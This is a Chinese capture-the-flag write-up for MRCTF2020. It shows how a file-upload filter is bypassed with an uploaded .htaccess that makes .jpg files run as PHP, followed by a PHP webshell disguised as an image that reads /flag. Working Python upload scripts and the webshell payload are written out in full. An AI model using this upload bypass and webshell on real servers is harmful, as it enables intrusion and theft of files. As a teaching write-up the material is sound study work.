# [MRCTF2020]你传你🐎呢

## 题目概述
题目是一个文件上传页面，标题"是兄弟就来传🐎"暗示文件上传漏洞。页面包含一个表单，可以上传文件到 `upload.php`。

## 信息收集
1. 访问首页，发现是一个简单的文件上传表单
2. 直接上传 PHP 文件被拒绝（返回"我扌your problem?"）
3. 上传 .jpg 后缀的文件成功，但 PHP 代码不会被执行
4. 发现使用 Session 后，同一 Session 上传的文件会保存到同一目录

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**: 文件上传 + .htaccess 配置覆盖

**原理**:
1. 服务器只检查文件扩展名，不检查文件内容
2. 允许上传 .htaccess 文件（Apache 配置文件）
3. 上传目录使用 Session ID 生成固定目录名，同一 Session 上传的文件在同一目录
4. 通过 .htaccess 可以让 .jpg 文件作为 PHP 执行

**判断过程**:
1. 上传 .php 文件被拒绝 → 存在扩展名检查
2. 上传 .jpg 文件成功 → 允许图片扩展名
3. 尝试上传 .htaccess 成功 → 未过滤配置文件
4. 使用 Session 保持目录一致 → 发现目录基于 Session 固定
5. 发现 `system()` 等命令执行函数被禁用 → 使用文件操作函数绕过

## 利用过程（Payload + Flag）

**Step 1: 使用 Session 上传 .htaccess**
```python
import requests

url = 'http://target/upload.php'
session = requests.Session()

# 上传 .htaccess，让 .jpg 作为 PHP 执行
htaccess = 'AddType application/x-httpd-php .jpg'
files = {'uploaded': ('.htaccess', htaccess, 'image/jpeg')}
r = session.post(url, files=files, data={'submit': '一键去世'})
```

**Step 2: 上传 webshell**
```python
# 使用文件操作函数绕过 disable_functions
shell_code = '''<?php
echo "<pre>";
$files = scandir('/');
print_r($files);
$flag_files = ['/flag', '/flag.txt'];
foreach ($flag_files as $f) {
    if (file_exists($f)) {
        echo file_get_contents($f);
    }
}
echo "</pre>";
?>'''

files = {'uploaded': ('shell.jpg', shell_code, 'image/jpeg')}
session.post(url, files=files, data={'submit': '一键去世'})
```

**Step 3: 访问 webshell 获取 flag**
```
http://target/upload/{directory}/shell.jpg
```

## 复现步骤
1. 使用 Python requests 保持 Session
2. 先上传 `.htaccess` 文件，内容为 `AddType application/x-httpd-php .jpg`
3. 再上传包含 PHP 代码的 `shell.jpg` 文件
4. 访问上传的 shell.jpg，PHP 代码被执行
5. 使用 `scandir()` 和 `file_get_contents()` 读取 /flag 文件

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 文件上传 | upload.php | .htaccess + .jpg webshell | Apache 配置覆盖 |
| 认证缺陷 | Session 固定 | 同一 Session 上传到同一目录 | PHP Session 机制 |
| disable_functions 绕过 | 命令执行禁用 | scandir() + file_get_contents() | PHP 文件操作函数 |

## 知识总结（解题技巧、同类题型套路）

1. **.htaccess 利用**: 当允许上传 .htaccess 时，可以通过 `AddType` 指令让任意扩展名作为 PHP 执行
2. **Session 固定目录**: 某些上传点使用 Session 生成目录名，保持 Session 可以让多个文件上传到同一目录
3. **disable_functions 绕过**: 当命令执行函数被禁用时，可以使用 `scandir()`、`file_get_contents()`、`glob()` 等文件操作函数读取文件
4. **上传绕过技巧**: 修改 Content-Type 为 `image/jpeg` 可以绕过简单的 MIME 检测
